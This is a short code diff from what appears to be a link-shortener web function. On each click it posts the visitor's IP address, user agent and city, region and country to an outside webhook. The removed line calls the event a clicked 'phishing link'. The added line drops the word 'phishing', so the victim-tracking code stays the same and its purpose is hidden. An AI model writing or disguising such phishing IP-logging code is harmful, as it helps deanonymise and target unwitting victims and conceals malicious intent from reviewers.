@@ -41,7 +41,7 @@ export async function onRequestGet(context) {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
-        content: `🕵️ 釣魚連結被點擊！\n短碼: ${shortCode}\n💻IP: ${ip}\nUser-Agent: ${ua}\n📬地點: ${geo.city}, ${geo.region}, ${geo.country}`
+        content: `🕵️ 連結被點擊！\n短碼: ${shortCode}\n💻IP: ${ip}\nUser-Agent: ${ua}\n📬地點: ${geo.city}, ${geo.region}, ${geo.country}`
       })
     }).catch(() => {});
 
